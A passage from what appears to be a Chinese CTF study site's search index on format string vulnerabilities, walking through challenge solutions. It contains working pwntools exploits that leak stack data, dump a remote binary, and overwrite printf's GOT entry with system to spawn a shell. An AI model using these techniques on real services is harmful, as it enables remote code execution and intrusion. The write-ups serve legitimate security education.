\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002 \u4f8b\u5b50 1 - \u6cc4\u9732\u6808 \u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git:(master) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528 \u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context.log_level = 'error' def leak(payload): sh = remote('127.0.0.1', 9999) sh.sendline(payload) data = sh.recvuntil('\\n', drop=True) if data.startswith('0x'): print p64(int(data, 16)) sh.close() i = 1 while 1: payload = '%{}$p'.format(i) leak(payload) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff flag{thi s_is_fla g}\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\xfe\\x7f\\x00\\x00 \u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got \u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002 \u786e\u5b9a\u504f\u79fb \u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002 \u6cc4\u9732 binary \u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() getbinary() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002 \u5206\u6790 binary \u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 \u6ce8\u89e3\uff1a \u8865\u5145\u4e00\u5f20\u56fe \u5229\u7528\u601d\u8def \u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell \u5229\u7528\u7a0b\u5e8f \u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\\x00') sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = (int)(math.ceil(len(payload) / 8.0) + 1) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u9898\u76ee SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#64","text":"","title":"64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"fmtstr/fmtstr_example/#_2","text":"\u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_3","text":"","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_4","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_5","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_6","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#hijack-got","text":"","title":"hijack GOT"},{"location":"fmtstr/fmtstr_example/#_7","text":"\u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_8","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_9","text":"\u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_10","text":"\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return 